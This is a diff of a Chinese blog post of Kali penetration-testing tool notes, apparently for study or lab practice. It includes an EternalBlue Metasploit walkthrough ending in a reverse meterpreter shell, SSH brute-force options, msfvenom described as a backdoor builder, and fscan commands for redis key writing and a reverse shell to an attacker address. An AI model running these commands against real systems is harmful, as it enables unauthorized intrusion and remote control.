@@ -29,13 +29,13 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png">
 <meta property="article:published_time" content="2025-01-30T08:22:34.000Z">
-<meta property="article:modified_time" content="2025-02-24T06:38:20.458Z">
+<meta property="article:modified_time" content="2025-03-25T15:07:49.751Z">
 <meta property="article:author" content="guayu-kakeru">
-<meta property="article:tag" content="笔记">
-<meta property="article:tag" content="工具">
 <meta property="article:tag" content="linux">
 <meta property="article:tag" content="操作系统">
 <meta property="article:tag" content="kali">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png">
 
@@ -230,7 +230,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-24 14:38:20" itemprop="dateModified" datetime="2025-02-24T14:38:20+08:00">2025-02-24</time>
+                <time title="修改时间：2025-03-25 23:07:49" itemprop="dateModified" datetime="2025-03-25T23:07:49+08:00">2025-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -322,6 +322,22 @@
 <tr>
 <td><code>-Pn</code></td>
 <td>跳过 Ping 检测，直接扫描目标主机（适用于防火墙屏蔽 Ping 的情况）。</td>
+</tr>
+<tr>
+<td>-p- 扫描所有端口（有时候直接ping一下不一定扫出来的） 这个服务和nmap扫出来的也不一定一样</td>
+<td></td>
+</tr>
+<tr>
+<td>后面可以-p 指定端口之后 加上 –script&#x3D;banner  或者-A</td>
+<td></td>
+</tr>
+<tr>
+<td>-sU 可以探测到服务</td>
+<td></td>
+</tr>
+<tr>
+<td>-6 用ipv6  可以先用ping6 -I ff02::1 扫描出ipv6地址，然后用nmap -6 [ip] -p 22  确定，多用于绕过22端口的filter</td>
+<td></td>
 </tr>
 </tbody></table>
 <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQLMap 是一个自动化 SQL 注入漏洞检测工具</p>
@@ -658,7 +674,13 @@
 </tr>
 </tbody></table>
 <h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 启动 Metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞</span></span><br><span class="line">search smb</span><br><span class="line"><span class="comment"># 该命令搜索与 SMB 相关的漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 选择漏洞模块</span></span><br><span class="line">use exploit<span class="regexp">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 选择 EternalBlue（MS17-010）漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看模块详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 显示当前模块的详细说明和可用选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置攻击目标</span></span><br><span class="line">set RHOSTS <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="comment"># 目标 IP 地址</span></span><br><span class="line"></span><br><span class="line">set RPORT <span class="number">445</span></span><br><span class="line"><span class="comment"># 选择目标端口 445（SMB 端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 设置本地攻击机的回连（反向 shell）</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">1.50</span></span><br><span class="line"><span class="comment"># 设置攻击者的 LHOST</span></span><br><span class="line"></span><br><span class="line">set LPORT <span class="number">4444</span></span><br><span class="line"><span class="comment"># 选择本地监听端口 4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 运行漏洞利用</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 启动漏洞攻击，如果成功，则会获得目标主机的 meterpreter shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 监听和管理会话</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="comment"># 列出当前活跃的会话</span></span><br><span class="line"></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># 进入 ID 为 1 的会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 获取系统权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># 尝试提升权限到 SYSTEM 级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 获取目标系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 查看目标系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 获取目标主机的 Shell</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 进入目标系统的命令行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 运行 Nmap 并保存扫描结果</span></span><br><span class="line">db_nmap -sV -p <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="comment"># 扫描 192.168.1.0/24 网络的 80, 443, 445 端口，并保存结果到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 退出 Metasploit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># 退出 msfconsole</span></span><br></pre></td></tr></table></figure></div>
-
+<ul>
+<li><strong><code>use auxiliary/scanner/ssh/ssh_login</code></strong>：<ul>
+<li><code>auxiliary</code>：Metasploit 中的辅助模块（不直接获取 shell，而是用于扫描、信息收集、登录尝试等）。</li>
+<li><code>scanner/ssh/ssh_login</code>：用于对目标 SSH 服务器进行用户名&#x2F;密码组合爆破。</li>
+</ul>
+</li>
+</ul>
 <h2 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h2><p>Cewl 是一个爬虫工具，可以抓取网站内容并生成密码字典。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w <span class="tag">&lt;<span class="name">输出文件</span>&gt;</span> -d <span class="tag">&lt;<span class="name">深度</span>&gt;</span> <span class="tag">&lt;<span class="name">URL</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
@@ -704,7 +726,8 @@
 <td>将破解成功的结果保存到指定文件中。</td>
 </tr>
 </tbody></table>
-<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> 是一个用 Go 语言编写的目录 &#x2F; 文件扫描工具，常用于渗透测试和安全审计中，目的是通过暴力破解或字典攻击来发现 Web 服务器上的隐藏目录和文件。<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>默认字典目录在<code>/usr/share/wordlists/dirbuster/</code> 下<br>-s 指定要显示的http状态码   -t指定线程 一般用50 60 -b 排除状态码<br>字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>一般是dirsearch没有发现有用的内容的时候用这个扫描器  用这个 medium字典</p>
+<p><code>-i</code>忽略密码字段，表示使用 SSH 私钥进行认证  <code>-s 22</code>：指定 SSH 端口（默认 22）  <code>-p id_rsa</code>：指定 SSH 私钥（即 <code>id_rsa</code>）<br>-V -I -e nsr   nsr表示尝试空密码 尝试用户名本身 尝试用户名反转</p>
+<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> 是一个用 Go 语言编写的目录 &#x2F; 文件扫描工具，常用于渗透测试和安全审计中，目的是通过暴力破解或字典攻击来发现 Web 服务器上的隐藏目录和文件。<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>默认字典目录在<code>/usr/share/wordlists/dirbuster/</code> 下<br>-s 指定要显示的http状态码   -t指定线程 一般用50 60 -b 排除状态码<br>字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>一般是dirsearch没有发现有用的内容的时候用这个扫描器  用这个 medium字典<br>-b 可以排除状态码  -x要检查的类型 比如 txt php </p>
 <h2 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h2><p><strong><code>enum4linux</code></strong> 是一款用于 Linux 系统上的 SMB（Server Message Block）协议枚举工具，常用于网络安全测试中进行 Windows 系统的枚举。它能够帮助渗透测试人员获取有关 Windows 系统的详细信息，例如共享资源、用户账户、操作系统版本、域名等。<br>功能和smbmap差不多</p>
 <h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
 <thead>
@@ -745,12 +768,9 @@
 <h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h2><p>Stegseek 是一款快速的 <strong>JPEG 隐写分析工具</strong>，专门用于破解 <code>steghide</code> 隐写的图片文件。它可以 <strong>高效爆破密码</strong>，并提取隐藏数据。</p>
 <p>Stegseek 主要功能包括：</p>
 <ul>
-<li><p><strong>快速爆破密码</strong>：基于字典的攻击，速度极快。</p>
-</li>
-<li><p><strong>提取隐藏数据</strong>：无需密码时，尝试默认密码或空密码提取。</p>
-</li>
-<li><p><strong>检查图片是否含有隐写数据</strong>。</p>
-</li>
+<li><strong>快速爆破密码</strong>：基于字典的攻击，速度极快。</li>
+<li><strong>提取隐藏数据</strong>：无需密码时，尝试默认密码或空密码提取。</li>
+<li><strong>检查图片是否含有隐写数据</strong>。</li>
 </ul>
 <h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
 <thead>
@@ -805,6 +825,123 @@
 </tr>
 </tbody></table>
 <p>一般指定rockyou字典就可以</p>
+<h2 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h2><p><code>steghide</code> 是 Kali Linux 中常用的 <strong>隐写术工具</strong>，主要用于 <strong>JPEG、BMP、WAV、AU</strong> 格式的 <strong>数据隐藏与提取</strong>。它支持 <strong>密码加密</strong>，因此如果数据被加密嵌入，需要正确的密码才能提取。</p>
+<p><strong>Steghide 常用参数</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>info</code></td>
+<td><strong>查看文件信息</strong>，检查是否包含隐藏数据</td>
+</tr>
+<tr>
+<td><code>extract</code></td>
+<td><strong>提取隐藏数据</strong></td>
+</tr>
+<tr>
+<td><code>embed</code></td>
+<td><strong>向文件中嵌入数据</strong></td>
+</tr>
+<tr>
+<td><code>-sf file</code></td>
+<td><strong>指定载体文件</strong>（如图片、音频）</td>
+</tr>
+<tr>
+<td><code>-ef file</code></td>
+<td><strong>指定要隐藏的文件</strong></td>
+</tr>
+<tr>
+<td><code>-p password</code></td>
+<td><strong>指定密码</strong>（如果有加密）</td>
+</tr>
+<tr>
+<td><code>-cf file</code></td>
+<td><strong>指定载体文件</strong>（用于嵌入数据）</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td><strong>详细模式</strong>（verbose，显示更多信息）</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>工具</strong></th>
+<th><strong>作用</strong></th>
+<th><strong>支持格式</strong></th>
+<th><strong>加密支持</strong></th>
+<th><strong>破解能力</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>steghide</strong></td>
+<td><strong>数据隐藏 &amp; 提取</strong></td>
+<td>JPEG、BMP、WAV、AU</td>
+<td>✅ 支持密码加密</td>
+<td>❌ 无法破解密码</td>
+</tr>
+<tr>
+<td><strong>stegseek</strong></td>
+<td><strong>快速破解 steghide 隐写密码</strong></td>
+<td><strong>仅支持 JPEG</strong></td>
+<td>✅ 破解加密的 steghide 文件</td>
+<td>✅ 超快字典攻击</td>
+</tr>
+</tbody></table>
+<h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p><code>zsteg</code> 是 Kali Linux 中用于检测 <strong>PNG</strong> 和 <strong>BMP</strong> 图像中的 <strong>隐写数据</strong>（Steganography）的工具。它能够扫描图像的 <strong>RGB 通道、Alpha 通道，以及不同位深度</strong> 来查找隐藏信息，比如 <strong>文本、二进制数据、shellcode</strong> 等。<br> <strong>zsteg 常用参数</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-a</code></td>
+<td>对图像进行<strong>全面扫描</strong>（常用）</td>
+</tr>
+<tr>
+<td><code>-c X</code></td>
+<td>仅扫描<strong>通道</strong> <code>X</code>（<code>r</code>&#x3D;红，<code>g</code>&#x3D;绿，<code>b</code>&#x3D;蓝，<code>a</code>&#x3D;透明度）</td>
+</tr>
+<tr>
+<td><code>-b X</code></td>
+<td>仅扫描<strong>第 X 位</strong>（如 <code>-b 1</code> 仅检测最低位 LSB）</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td><strong>显示详细信息</strong>（verbose 模式）</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>仅显示 <strong>有效结果</strong></td>
+</tr>
+<tr>
+<td><code>-E fmt</code></td>
+<td>以指定格式提取数据（如 <code>-E bin</code> 提取二进制）</td>
+</tr>
+<tr>
+<td><code>--lsb Y</code></td>
+<td>仅扫描 <code>Y</code> 位的 <strong>最低有效位（LSB）</strong></td>
+</tr>
+<tr>
+<td><code>-o filename</code></td>
+<td><strong>将提取的数据输出</strong>到文件</td>
+</tr>
+<tr>
+<td><code>-q</code></td>
+<td><strong>安静模式</strong>（只输出必要信息）</td>
+</tr>
+<tr>
+<td><code>--dump</code></td>
+<td>直接转储找到的数据</td>
+</tr>
+</tbody></table>
+<h2 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h2><p><code>rax2</code> 是 radare 框架中的一个小工具，其设计目的是为 shell 提供一个小型的表达式计算器。其可用于浮点数、十六进制字节的进制转换，十六进制转 ascii，八进制转整数等。若未传入任何参数还可作为一个计算器 shell 使用。<br>输入 rax2 -h 查看参数</p>
 <h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p> <code>tcpdump</code> 是 Linux 和 macOS 上的<strong>网络抓包工具</strong>，用于<strong>抓取、分析和过滤网络数据包</strong>，类似于 Wireshark 的命令行版本。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">A</span> -n icmp</span><br></pre></td></tr></table></figure></div>
 <p><strong>这个命令的作用是：</strong><br>👉 <strong>监听 ICMP（Internet Control Message Protocol）流量</strong>，比如 <code>ping</code> 请求和回复，并以 <strong>ASCII 方式显示数据包内容</strong>。<br>-A  以 <strong>ASCII 格式</strong> 显示数据包内容，方便阅读（适用于明文协议）<br>-n <strong>不解析 DNS</strong>，直接显示 IP 地址（加快速度）<br>icmp 只抓取 <strong>ICMP</strong> 流量，比如 <code>ping</code> 请求和响应</p>
@@ -857,6 +994,102 @@
 <td>设置输出详细程度。</td>
 </tr>
 </tbody></table>
+<h2 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h2><p><code>ssh-keygen</code> 是一个用于生成、管理和转换 SSH 认证密钥的命令行工具。它支持多种密钥类型，包括 RSA、DSA、ECDSA 和 Ed25519。该工具常用于为 SSH 连接创建公钥和私钥对，以实现安全的无密码登录。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-t</code></td>
+<td align="left">指定要创建的密钥类型，如 <code>rsa</code>、<code>dsa</code>、<code>ecdsa</code>、<code>ed25519</code> 等。</td>
+</tr>
+<tr>
+<td align="left"><code>-b</code></td>
+<td align="left">设置密钥长度（以位为单位），例如 2048 或 4096。</td>
+</tr>
+<tr>
+<td align="left"><code>-C</code></td>
+<td align="left">添加注释，通常用于标识密钥所有者，例如邮箱地址。</td>
+</tr>
+<tr>
+<td align="left"><code>-f</code></td>
+<td align="left">指定密钥文件的保存路径和名称。</td>
+</tr>
+<tr>
+<td align="left"><code>-N</code></td>
+<td align="left">为私钥设置新密码。</td>
+</tr>
+<tr>
+<td align="left"><code>-P</code></td>
+<td align="left">提供旧密码，用于更改现有私钥的密码。</td>
+</tr>
+<tr>
+<td align="left"><code>-q</code></td>
+<td align="left">静默模式，在生成密钥时不显示提示和进度。</td>
+</tr>
+<tr>
+<td align="left"><code>-y</code></td>
+<td align="left">从私钥文件读取并输出对应的公钥。</td>
+</tr>
+<tr>
+<td align="left"><code>-l</code></td>
+<td align="left">显示指定公钥文件的指纹信息。</td>
+</tr>
+<tr>
+<td align="left"><code>-e</code></td>
+<td align="left">将 OpenSSH 私钥转换为 RFC 4716 格式。</td>
+</tr>
+<tr>
+<td align="left"><code>-i</code></td>
+<td align="left">将 RFC 4716 格式的密钥转换为 OpenSSH 格式。</td>
+</tr>
+<tr>
+<td align="left"><code>-p</code></td>
+<td align="left">更改现有私钥文件的密码。</td>
+</tr>
+<tr>
+<td align="left"><code>-o</code></td>
+<td align="left">强制使用新的 OpenSSH 格式保存私钥，提供更好的安全性。</td>
+</tr>
+<tr>
+<td align="left"><code>-m</code></td>
+<td align="left">指定密钥的显示或保存格式，如 <code>PEM</code>。</td>
+</tr>
+<tr>
+<td align="left"><code>-r</code></td>
+<td align="left">生成用于 DNS 的 SSHFP 资源记录。</td>
+</tr>
+<tr>
+<td align="left"><code>-B</code></td>
+<td align="left">以 Bubble Babble 格式显示密钥指纹。</td>
+</tr>
+<tr>
+<td align="left"><code>-F</code></td>
+<td align="left">搜索指定的已知主机文件中的主机条目。</td>
+</tr>
+<tr>
+<td align="left"><code>-R</code></td>
+<td align="left">从已知主机文件中删除指定主机的所有条目。</td>
+</tr>
+</tbody></table>
+<p>所以要用私钥生成公钥就用<code>ssh-keygen -y -f ~/.ssh/id_rsa &gt; ~/.ssh/id_rsa.pub</code></p>
+<h2 id="msf-pattern-create"><a href="#msf-pattern-create" class="headerlink" title="msf-pattern_create"></a>msf-pattern_create</h2><p><code>msf-pattern_create</code> 是 Metasploit Framework 中的一个工具，用于生成特定的模式字符串，通常用于缓冲区溢出漏洞测试中的模式创建。</p>
+<p>它通过生成一组唯一的字节模式（通常是 ASCII 字符串），这些模式可以帮助你定位栈溢出时的返回地址或其他溢出点。常见的使用场景包括：</p>
+<h2 id="msf-pattern-offset"><a href="#msf-pattern-offset" class="headerlink" title="msf-pattern_offset"></a>msf-pattern_offset</h2><p><code>msf-pattern_offset</code> 是 Metasploit Framework 中的一个工具，通常用于缓冲区溢出漏洞测试中，帮助调试人员确定输入模式的偏移量。简单来说，它用于分析程序崩溃时的栈，帮助你找出溢出数据到达返回地址或其他关键内存位置的精确偏移。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 0x6161616b</span><br></pre></td></tr></table></figure></div>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>msfvenom 是 msfpayload（攻击载荷）和 msfencode（编码加密）的组合。将这两个工具集成在一个框实例中。</p>
+<p>进一步解释，msfvenom 是用来生成后门的软件，在目标机上执行后门，在本地监听上线，可以理解为一个远控木马。</p>
+<p>msfvenom 基本参数<br>-p:–payload，指定特定的 Payload，如果被设置为，那么从标准输入流中读取。几乎支持全平台<br>-l:–list，列出所有可用的项目，其中值可以被设置为 payloads,encoders,nops,all<br>-n:–nopsled，指定 nop 在 payload 中的数量<br>-f:–format，指定 Payload 的输出格式 (–list formats: 列出所有可用的输出格式)<br>-e: –encoder，指定使用的 encoder<br>-a:–arch，指定目标系统架构<br>–platform: 指定目标系统平台<br>-s:–space，设置未经编码的 Payload 的最大长度 (–encoder-space: 编码后的 Payload 的最大长度)<br>-b:–bad-chars，设置需要在 Payload 中避免出现的字符，例如: 0f’lx00’等<br>-i:–iterations，设置 Payload 的编码次数<br>–smallest: 尽可能生成最短的 Payload<br>-o:–out，保存 Pavload 到文件<br>-c –add-code，指定一个附加的 win32 shellcode 文件<br>-x –template，指定一个特定的可执行文件作为模板<br>-k –keep，保护模板程序的功能，注入的 pavload 作为一个新的进程运行</p>
+<p>最常用的参数就是 -p ，-f ，-x 和 -e</p>
+<p>-f raw生成原始的shellcode</p>
+<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan 是一个内网综合扫描工具，方便一键自动化、全方位<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020">漏洞扫描</a>。</p>
+<p>它支持主机存活探测、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020">端口扫描</a>、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。<br>简单用法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span>  (默认使用全部模块)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">16</span>  (B段扫描)</span><br></pre></td></tr></table></figure></div>
+<p>其他用法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -rf id_rsa.pub (redis 写公钥)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -rs <span class="number">192.168.1.1:6666</span> (redis 计划任务反弹shell)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m ssh -p <span class="number">2222</span> (指定模块ssh和端口)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -o /tmp/<span class="number">1</span>.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">8</span>  (A段的<span class="number">192</span>.x.x.<span class="number">1</span>和<span class="number">192</span>.x.x.<span class="number">254</span>,方便快速查看网段信息 )</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m smb -pwd password (smb密码碰撞)</span><br><span class="line"><span class="attribute">fscan</span>.exe -h <span class="number">192.168.1.1</span>/<span class="number">24</span> -m ms17010 (指定模块)</span><br><span class="line"><span class="attribute">fscan</span>.exe -hf ip.txt  (以文件导入)</span><br></pre></td></tr></table></figure></div>
 
     </div>
 
@@ -883,11 +1116,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
-              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
               <a href="/tags/linux/" rel="tag"># linux</a>
               <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag"># 操作系统</a>
               <a href="/tags/kali/" rel="tag"># kali</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
           </div>
 
         
@@ -961,7 +1194,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#John-the-Ripper"><span class="nav-text">John the Ripper</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wpscan"><span class="nav-text">wpscan</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wfuzz"><span class="nav-text">wfuzz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-z-%E9%80%89%E9%A1%B9%EF%BC%9A"><span class="nav-text">常见的 -z 选项：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%97%A0%E6%95%88%E5%93%8D%E5%BA%94"><span class="nav-text">过滤无效响应</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#binwalk"><span class="nav-text">binwalk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dos2Unix"><span class="nav-text">Dos2Unix</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SearchSploit"><span class="nav-text">SearchSploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-msfconsole"><span class="nav-text">Metasploit (msfconsole)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item 